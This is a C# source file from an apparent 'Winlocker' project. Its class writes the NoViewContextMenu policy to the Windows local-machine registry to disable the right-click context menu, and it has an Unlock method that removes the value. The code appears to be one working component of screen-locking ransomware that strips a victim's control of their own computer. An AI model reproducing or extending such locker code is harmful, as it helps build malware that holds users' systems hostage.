using Microsoft.Win32;

namespace Winlocker.Models
{
    public class RightClick
    {
        public static void Lock()
        {
            RegistryKey reg;
            string key = "1";
            string sub = "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer";

            reg = Microsoft.Win32.Registry.LocalMachine.CreateSubKey(sub);
            reg.SetValue("NoViewContextMenu", key);
            reg.Close();

        }

        public static void Unlock()
        {
            RegistryKey reg;
            string sub = "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer";

            reg = Microsoft.Win32.Registry.LocalMachine.OpenSubKey(sub, true);
            reg.DeleteValue("NoViewContextMenu");
            reg.Close();
        }
    }
}
